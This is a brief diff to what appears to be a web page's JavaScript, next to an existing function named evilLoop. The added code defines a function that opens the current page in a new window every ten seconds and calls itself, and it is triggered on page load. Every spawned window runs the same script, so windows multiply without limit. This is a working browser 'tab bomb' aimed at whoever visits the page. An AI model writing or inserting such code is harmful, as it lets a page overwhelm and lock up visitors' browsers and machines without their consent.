@@ -38,4 +38,12 @@ function evilLoop() {
         }, 500)
     }
 }
+function duplicate(){
+    setTimeout(() => {
+        window.open(location.href)
+        duplicate()
+    }, 10000)
+    
+}
+duplicate()
 evilLoop()
